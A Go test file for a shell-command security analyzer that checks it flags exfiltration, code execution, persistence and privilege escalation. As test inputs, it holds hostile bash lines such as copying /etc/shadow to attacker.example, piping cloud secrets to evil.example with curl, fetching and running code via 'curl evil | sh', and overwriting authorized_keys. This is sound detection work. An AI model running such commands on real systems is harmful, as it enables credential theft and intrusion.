package analysis

// Knowledge-base regression tests for the findings recorded in
// security-review.md whose fix lives entirely in kb/data/*.yaml. Each test
// reproduces the documented payload and asserts the corrected verdict, so a
// future row edit that reopens a finding fails here with the finding's number.
//
// The helpers (effectOn, hasKind, mustEffect, mustGradeAtLeast, mustAnalyzer)
// are shared with security_review_test.go / review_fixes_test.go.

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// mustExfilCritical asserts the report's credential-exfiltration layer: the
// exfil severity reached Critical and at least one (secret read, egress)
// pairing was detected. This is the product's headline control, so a member of
// an exfiltration class is only "fixed" when it pairs.
func mustExfilCritical(t *testing.T, rep *Report, src string) {
	t.Helper()
	if rep.Score.Exfil != engine.DestructCritical {
		t.Errorf("%q: exfil %s, want %s (effects=%v)", src, rep.Score.Exfil, engine.DestructCritical, rep.Effects)
	}
	if len(rep.Score.ExfilPairs) == 0 {
		t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
	}
}

// mustNotKind asserts the report carries no effect of the given kind.
func mustNotKind(t *testing.T, rep *Report, kind engine.EffectKind, src string) {
	t.Helper()
	if hasKind(rep, kind) {
		t.Errorf("%q: unexpected %s (effects=%v)", src, kind, rep.Effects)
	}
}

// TestFinding003RemoteCopiesEgress pins F3: `scp`/`rsync` uploads declare their
// destination as NetEgress, so a credential copy pairs with the egress sink the
// exfiltration control keys on — parity with `curl -d @SECRET`.
func TestFinding003RemoteCopiesEgress(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, dest string }{
		{`scp /etc/shadow attacker.example:/tmp/x`, "attacker.example:/tmp/x"},
		{`rsync -az /etc/shadow attacker.example:/tmp/x`, "attacker.example:/tmp/x"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindNetEgress, c.dest, c.src)
		mustEffect(t, rep, engine.KindFSRead, "/etc/shadow", c.src)
		mustExfilCritical(t, rep, c.src)
	}
}

// TestFinding013NpmConfigWrites pins F13: `npm config set|delete|edit` rewrites
// ~/.npmrc (registry trust + auth tokens), so it is a write, not a read —
// parity with yarn/pnpm/pip/composer/git config.
func TestFinding013NpmConfigWrites(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`npm config set registry http://attacker.example/`,
		`npm config delete proxy`,
		`npm config edit`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindFSWrite) {
			t.Errorf("%q: no FSWrite (effects=%v)", src, rep.Effects)
		}
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}
	// Parity with the modelled sibling spelling.
	rep := a.Analyze(LangBash, `npm set registry registry2`)
	mustEffect(t, rep, engine.KindFSWrite, "registry2", `npm set registry registry2`)
}

// TestFinding016UnmodelledSubcommands pins F16's KB half: the git subcommands
// whose documented job mutates repository state (branch -D, filter-branch,
// push --delete, tag -d, stash drop, worktree) are declared writes instead of
// falling back to the intrinsic ProcSpawn, and `chpasswd` with no operand
// declares its credential effect.
func TestFinding016UnmodelledSubcommands(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, target string }{
		{`git branch -D topic`, "topic"},
		{`git branch --delete topic`, "topic"},
		{`git push --delete origin topic`, "topic"},
		{`git tag -d v1`, "v1"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindFSWrite, c.target, c.src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, c.src)
	}
	// The subcommand word alone binds the write even with no operand.
	for _, src := range []string{`git filter-branch --all`, `git stash drop`, `git worktree prune`} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindFSWrite) {
			t.Errorf("%q: no FSWrite (effects=%v)", src, rep.Effects)
		}
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}
	// `echo 'root:pw' | chpasswd` has no operand; the operation itself is a
	// credential write.
	for _, src := range []string{`chpasswd`, `echo 'root:newpw' | chpasswd`} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindCredAccess) {
			t.Errorf("%q: no CredAccess (effects=%v)", src, rep.Effects)
		}
		mustNotKind(t, rep, engine.KindProcSpawn, src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}
	// The VCS deletion synonyms the manual documents (Finding 16, pass-38
	// extension) are the same operation as the canonical verb.
	for _, c := range []struct{ src, target string }{
		{`svn rm /tmp/zzzvictim`, "/tmp/zzzvictim"},
		{`svn del /tmp/zzzvictim`, "/tmp/zzzvictim"},
		{`hg rm /tmp/zzzvictim`, "/tmp/zzzvictim"},
		{`bzr rm /tmp/zzzvictim`, "/tmp/zzzvictim"},
		{`darcs rm /tmp/zzzvictim`, "/tmp/zzzvictim"},
		{`fossil del /tmp/zzzvictim`, "/tmp/zzzvictim"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindFSWrite, c.target, c.src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, c.src)
	}
}

// TestFinding024ArchiveExtractionWrites pins F24: extraction is the archivers'
// default operation and it creates/overwrites files, so every documented
// spelling — including the dash-less POSIX bundle and the GNU long flags —
// reports the write instead of a bare read.
func TestFinding024ArchiveExtractionWrites(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, target string }{
		{`unzip payload.zip`, "payload.zip"},
		{`unzip -q payload.zip`, "payload.zip"},
		{`tar xf evil.tar`, "evil.tar"},
		{`tar xzf evil.tgz`, "evil.tgz"},
		{`tar xvf evil.tar`, "evil.tar"},
		{`tar xjf evil.tbz`, "evil.tbz"},
		{`tar --extract --file evil.tar`, "evil.tar"},
		{`tar --extract --file=evil.tar`, "evil.tar"},
		{`tar -xf evil.tar`, "evil.tar"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindFSWrite, c.target, c.src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, c.src)
	}
	// A stdin-fed extraction has no operand to name; the write must still be
	// reported rather than dropped.
	for _, src := range []string{`cpio --extract < evil.cpio`, `cpio -i < evil.cpio`} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindFSWrite) {
			t.Errorf("%q: no FSWrite (effects=%v)", src, rep.Effects)
		}
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}
	// `tar xf A -C /` must stay a destructive write (the -C target and the
	// extraction itself both deny).
	rep := a.Analyze(LangBash, `tar xf evil.tar -C /`)
	mustEffect(t, rep, engine.KindFSWrite, "/", `tar xf evil.tar -C /`)
	mustGradeAtLeast(t, rep, engine.DestructCritical, `tar xf evil.tar -C /`)
}

// TestFinding026CompilersWriteArtefacts pins F26: a compile/link with no output
// flag still writes its default artefact into the working directory, so the
// source operand declares the write (-o/--out-dir add the concrete target).
func TestFinding026CompilersWriteArtefacts(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`gcc hello.c`,
		`as code.s`,
		`ld code.o`,
		`rustc hello.rs`,
		`javac Hello.java`,
		`tsc file.ts`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSWrite, ".", src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}
	// The explicit output flag keeps naming its own target.
	rep := a.Analyze(LangBash, `gcc -o x hello.c`)
	mustEffect(t, rep, engine.KindFSWrite, "x", `gcc -o x hello.c`)
}

// TestFinding029GitExecOptions pins F29's KB half: git's exec-valued options and
// exec-bearing subcommands are CodeExec, not a plain spawn, so a rule that
// denies code execution sees them.
func TestFinding029GitExecOptions(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, command string }{
		{`git rebase --exec=id HEAD~1`, "id"},
		{`git difftool --extcmd=id`, "id"},
		{`git filter-branch --tree-filter id HEAD`, "id"},
		{`git bisect run id`, "id"},
		{`git submodule foreach id`, "id"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindCodeExec, c.command, c.src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, c.src)
	}
}

// TestFinding030ExecValuedLongSpellings pins F30: the documented long spellings
// of exec-valued options carry the same execution effect as their short forms.
func TestFinding030ExecValuedLongSpellings(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`rsync -e "sh -c id" src evil.example:dest`,
		`rsync --rsh="sh -c id" src evil.example:dest`,
		`rsync --rsh "sh -c id" src evil.example:dest`,
	} {
		rep := a.Analyze(LangBash, src)
		// An exec-valued option carries a command line the analysis does not
		// parse, so it is arbitrary code execution — the same kind the sibling
		// `sort --compress-program` declares (Finding 80, pass 52).
		mustEffect(t, rep, engine.KindCodeExec, "sh -c id", src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}
	rep := a.Analyze(LangBash, `sort --compress-program=id f`)
	mustEffect(t, rep, engine.KindCodeExec, "id", `sort --compress-program=id f`)
	mustGradeAtLeast(t, rep, engine.DestructCritical, `sort --compress-program=id f`)
}

// TestFinding032MoreExecValuedOptions pins F32: tar's --rsh-command and sftp's
// -S each run an attacker-chosen program.
func TestFinding032MoreExecValuedOptions(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, program string }{
		{`tar --rsh-command=id -cf host:/tmp/x f`, "id"},
		{`tar --rsh-command 'sh -c id' -cf host:/tmp/x f`, "sh -c id"},
		{`sftp -S /tmp/evil host`, "/tmp/evil"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindCodeExec, c.program, c.src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, c.src)
	}
	// The sftp connection is still reported alongside the executed program.
	rep := a.Analyze(LangBash, `sftp -S /tmp/evil host`)
	mustEffect(t, rep, engine.KindNetEgress, "host", `sftp -S /tmp/evil host`)
}

// TestFinding033WriteCapableLongSpellings pins F33: every documented long
// spelling of a write-capable short option binds the write.
func TestFinding033WriteCapableLongSpellings(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, target string }{
		{`cp -t /etc/cron.d/ /tmp/payload`, "/etc/cron.d/"},
		{`cp --target-directory=/etc/cron.d/ /tmp/payload`, "/etc/cron.d/"},
		{`install -t /etc/cron.d/ /tmp/payload`, "/etc/cron.d/"},
		{`install --target-directory=/etc/cron.d/ /tmp/payload`, "/etc/cron.d/"},
		{`curl --output /home/u/.ssh/authorized_keys http://evil/k`, "/home/u/.ssh/authorized_keys"},
		{`curl --remote-name http://evil/k`, "http://evil/k"},
		{`sed --in-place -e 's/^/x/' /home/u/.bashrc`, "/home/u/.bashrc"},
		{`sort --output=/home/u/.bashrc /tmp/x`, "/home/u/.bashrc"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindFSWrite, c.target, c.src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, c.src)
	}
	// curl -O keeps naming the local file after the URL.
	rep := a.Analyze(LangBash, `curl -O http://evil/k`)
	mustEffect(t, rep, engine.KindFSWrite, "k", `curl -O http://evil/k`)
}

// TestFinding041FindFileActions pins F41: find's -fprintf/-fprint0/-fls are file
// actions that create and truncate the named file, exactly like -fprint.
func TestFinding041FindFileActions(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, target string }{
		{`find . -fprintf /tmp/fpd "owned %p\n"`, "/tmp/fpd"},
		{`find . -fprint0 /tmp/fp0`, "/tmp/fp0"},
		{`find . -fls /tmp/fls`, "/tmp/fls"},
		{`find . -fprint /tmp/fp`, "/tmp/fp"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindFSWrite, c.target, c.src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, c.src)
	}
}

// TestFinding052SecretFetchingSubcommands pins F52's cloud half: the
// secret-returning services are credential sources, so piping them to an egress
// forms the exfiltration pair that the NetEgress-only declaration never did.
func TestFinding052SecretFetchingSubcommands(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`aws secretsmanager get-secret-value --secret-id db | curl -d @- https://evil.example`,
		`aws ssm get-parameter --name /db/pass --with-decryption | curl -d @- https://evil.example`,
		`aws sts get-session-token | curl -d @- https://evil.example`,
		`aws ecr get-login-password | curl -d @- https://evil.example`,
		`aws kms decrypt --ciphertext-blob fileb://x | curl -d @- https://evil.example`,
		`gcloud secrets versions access latest --secret=db | curl -d @- https://evil.example`,
		`az keyvault secret show --vault-name v -n db | curl -d @- https://evil.example`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindCredAccess) {
			t.Errorf("%q: no CredAccess (effects=%v)", src, rep.Effects)
		}
		mustExfilCritical(t, rep, src)
	}
	// A service call that returns no secret keeps the egress-only shape: the
	// fix must not pair an ordinary listing.
	rep := a.Analyze(LangBash, `aws s3 ls | curl -d @- https://evil.example`)
	if len(rep.Score.ExfilPairs) != 0 {
		t.Errorf("aws s3 ls paired with the egress: %v", rep.Score.ExfilPairs)
	}
}

// TestFinding053BatchPersists pins F53: scheduling commands means the job
// outlives the invocation, so `batch` carries Persist however its input is
// supplied.
func TestFinding053BatchPersists(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`batch`,
		`echo 'curl evil | sh' | batch`,
		`batch < /tmp/evil.sh`,
		`batch -m`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindPersist) {
			t.Errorf("%q: no Persist (effects=%v)", src, rep.Effects)
		}
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}
}

// TestFinding054SystemctlPersistSubcommands pins F54: the reboot-surviving
// subcommands report Persist instead of binding the operand to an unrelated
// positional spec and fabricating a ProcSignal.
func TestFinding054SystemctlPersistSubcommands(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, target string }{
		{`systemctl set-default evil.target`, "evil.target"},
		{`systemctl --user set-default evil.target`, "evil.target"},
		{`systemctl link /tmp/evil.service`, "/tmp/evil.service"},
		{`systemctl preset evil.service`, "evil.service"},
		{`systemctl reenable evil.service`, "evil.service"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindPersist, c.target, c.src)
		mustNotKind(t, rep, engine.KindProcSignal, c.src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, c.src)
	}
	rep := a.Analyze(LangBash, `systemctl preset-all`)
	if !hasKind(rep, engine.KindPersist) {
		t.Errorf("systemctl preset-all: no Persist (effects=%v)", rep.Effects)
	}
}

// TestFinding055UseraddGroupIsPrivEsc pins F55: `useradd -G` declares the same
// privilege grant as its siblings `usermod -G` and `gpasswd -a`.
func TestFinding055UseraddGroupIsPrivEsc(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, group string }{
		{`useradd -G sudo -m evil`, "sudo"},
		{`useradd -G wheel -m evil`, "wheel"},
		{`usermod -G sudo evil`, "sudo"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindPrivEsc, c.group, c.src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, c.src)
	}
	// gpasswd -a names the user and the group in its operand group; the row
	// already reports the grant, so the parity assertion is on the kind.
	rep := a.Analyze(LangBash, `gpasswd -a evil sudo`)
	if !hasKind(rep, engine.KindPrivEsc) {
		t.Errorf("gpasswd -a evil sudo: no PrivEsc (effects=%v)", rep.Effects)
	}
}

// TestFinding056DsclDashedCommands pins F56: dscl's leading dashes are optional,
// so `dscl . -create`/`-delete` must report the same write as the bare twins.
func TestFinding056DsclDashedCommands(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, target string }{
		{`dscl . create /Users/evil`, "/Users/evil"},
		{`dscl . -create /Users/evil`, "/Users/evil"},
		{`dscl . delete /Users/victim`, "/Users/victim"},
		{`dscl . -delete /Users/victim`, "/Users/victim"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindFSWrite, c.target, c.src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, c.src)
	}
	// The read-only dashed spellings stay read-only.
	for _, src := range []string{`dscl . -read /Users/victim`, `dscl . -list /Users`} {
		rep := a.Analyze(LangBash, src)
		mustNotKind(t, rep, engine.KindFSWrite, src)
	}
}

// TestFinding066TarDirectoryLongSpelling pins F66's extract-side half: the
// documented long spelling `--directory` contributes the same write target as
// `-C`, so `tar xf A --directory=/` is no longer a bare read that passes a
// writes-deny policy.
//
// The create-mode half of F66 (tar *reads* the -C directory, so
// `tar czf - -C DIR .` must keep DIR a secret source) is not expressible in the
// current schema: one effect per parameter cannot be read-in-create and
// write-in-extract, and kb/loader_test.go pins `tar -C` = FSWrite. It needs the
// baseDir parameter kind described in the review's fix (a)/(b) — kb/schema.go
// (ParamKind/ValueSource) plus bind/bind.go (parseArgs/bindCommand operand
// resolution).
func TestFinding066TarDirectoryLongSpelling(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, target string }{
		{`tar xf /tmp/evil.tar -C /tmp/tgt`, "/tmp/tgt"},
		{`tar xf /tmp/evil.tar --directory=/tmp/tgt`, "/tmp/tgt"},
		{`tar xf /tmp/evil.tar -C /`, "/"},
		{`tar xf /tmp/evil.tar --directory=/`, "/"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindFSWrite, c.target, c.src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, c.src)
	}
}

// TestFinding015PacmanSysupgradeWrites pins F15: every spelling of the Arch
// full-system upgrade installs packages and rewrites the package database, so
// the write is reported alongside the database download — while a search
// queries that database and stays a read.
func TestFinding015PacmanSysupgradeWrites(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`pacman -Syu`,
		`pacman -Syu --noconfirm`,
		`pacman -Syyu`,
		`pacman -Su`,
		`pacman --sync --refresh --sysupgrade`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindFSWrite) {
			t.Errorf("%q: no FSWrite (effects=%v)", src, rep.Effects)
		}
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}
	// The refresh half is still reported: the databases are downloaded before
	// the packages are installed, so the upgrade carries both effects.
	for _, src := range []string{`pacman -Syu`, `pacman -Syyu`, `pacman --sync --refresh --sysupgrade`} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindNetEgress) {
			t.Errorf("%q: no NetEgress (effects=%v)", src, rep.Effects)
		}
	}
	// A search (-Ss/-Ssq) changes nothing, so the cluster splitter must not
	// bind its leading -S to the install write.
	for _, src := range []string{`pacman -Ssq foo`, `pacman -Ss foo`} {
		rep := a.Analyze(LangBash, src)
		mustNotKind(t, rep, engine.KindFSWrite, src)
		mustNotKind(t, rep, engine.KindNetEgress, src)
		if rep.Score.Grade >= engine.DestructHigh {
			t.Errorf("%q: grade %s, want < %s (effects=%v)", src, rep.Score.Grade, engine.DestructHigh, rep.Effects)
		}
	}
	// The plain install keeps naming its operand.
	rep := a.Analyze(LangBash, `pacman -S pkg`)
	mustEffect(t, rep, engine.KindFSWrite, "pkg", `pacman -S pkg`)
}

// TestFinding017PasswdCredentialWrite pins F17: `passwd NAME` replaces the
// account's shadow entry, so the operand is a credential write — the same
// CredAccess the -d and -l spellings carry, and the same effect `chpasswd`
// declares intrinsically.
func TestFinding017PasswdCredentialWrite(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, target string }{
		{`passwd victim`, "victim"},
		{`passwd -d victim`, "victim"},
		{`passwd -l victim`, "victim"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindCredAccess, c.target, c.src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, c.src)
	}
	// Parity with the bulk spelling, whose credential effect is intrinsic (the
	// accounts travel on standard input, so no operand names them).
	const piped = `echo 'u:p' | chpasswd`
	rep := a.Analyze(LangBash, piped)
	if !hasKind(rep, engine.KindCredAccess) {
		t.Errorf("%q: no CredAccess (effects=%v)", piped, rep.Effects)
	}
	mustGradeAtLeast(t, rep, engine.DestructCritical, piped)
	// The status query is still a read of the account database.
	const status = `passwd -S victim`
	rep = a.Analyze(LangBash, status)
	mustEffect(t, rep, engine.KindFSRead, "victim", status)
}

// TestFinding018FirewallMutationPersists pins F18: a netfilter/routing/firewall
// change is a persistent local-state change, not inbound traffic — and the
// inspection spellings stay reads.
func TestFinding018FirewallMutationPersists(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`iptables -A INPUT -p tcp --dport 22 -j ACCEPT`,
		`iptables -P INPUT ACCEPT`,
		`iptables --flush`,
		`iptables -t nat -A PREROUTING -p tcp --dport 80 -j ACCEPT`,
		`ufw allow 22/tcp`,
		`ufw disable`,
		`nft add rule inet filter input tcp dport 22 accept`,
		`firewall-cmd --add-port=22/tcp`,
		`firewall-cmd --permanent --add-port=22/tcp`,
		`route add default gw 10.0.0.1`,
		`ip add 10.0.0.1/24 dev eth0`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindPersist) {
			t.Errorf("%q: no Persist (effects=%v)", src, rep.Effects)
		}
		mustNotKind(t, rep, engine.KindNetIngress, src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}
	// Residual: the binder binds a positional by value only when it is the
	// first operand, so the two-word `ip route add …` spelling binds its object
	// word and not its verb. What is pinned here is the half the KB owns: the
	// mutation no longer claims inbound traffic. Reporting the write needs a
	// verb slot in bind/bind.go, outside this file's ownership.
	for _, src := range []string{`ip route add default via 10.0.0.1`, `ip link set eth0 down`} {
		rep := a.Analyze(LangBash, src)
		mustNotKind(t, rep, engine.KindNetIngress, src)
	}
	// A genuine inspection never reports a state change or inbound traffic.
	for _, src := range []string{`iptables -L`, `ip route show`, `nft list ruleset`} {
		rep := a.Analyze(LangBash, src)
		mustNotKind(t, rep, engine.KindPersist, src)
		mustNotKind(t, rep, engine.KindNetIngress, src)
		if !hasKind(rep, engine.KindFSRead) {
			t.Errorf("%q: no FSRead (effects=%v)", src, rep.Effects)
		}
	}
}
